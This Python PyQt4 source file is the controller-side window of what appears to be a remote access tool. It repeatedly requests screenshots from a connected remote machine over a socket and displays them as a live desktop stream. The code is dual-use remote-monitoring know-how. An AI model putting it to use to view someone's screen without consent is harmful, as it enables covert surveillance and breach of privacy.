from PyQt4.QtGui import *
from PyQt4.QtCore import *

import threading
import socket
import Image
import zlib
import os
from ast import literal_eval

from main_ui import Ui_Form

from libs.modechat import get, send


class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.socket = args['socket']
        self.ipAddress = args['ipAddress']
        self.tmp = args['tempPath']

        self.setWindowTitle('Desktop Streaming from - %s - Socket #%s' % (self.ipAddress, self.socket))

        # update gui
        self.gui = QApplication.processEvents

        self.startStreamingButton.clicked.connect(self.set_screenshot)

    def set_screenshot(self):
        while 1:
            self.gui()
            try:
                data = get(self.sock, 'getScreenshot', 'screenshotget')
                result = literal_eval(data)
                path_to_preview = os.path.join(self.tmp, 'temp__preview.png')
                im = Image.frombuffer('RGB', (int(result['width']), int(result['height'])),
                                      zlib.decompress(result['screenshotbits']), 'raw', 'BGRX', 0, 1).save(
                    path_to_preview, 'PNG')
                self.screenshotLabel.setPixmap(QPixmap(path_to_preview).scaled(
                    QSize(self.screenshotLabel.width(), self.screenshotLabel.height())))
            except (socket.error, ValueError):
                break
                # send(self.sock, 'stopDesktop')

    def closeEvent(self, event):
        pass
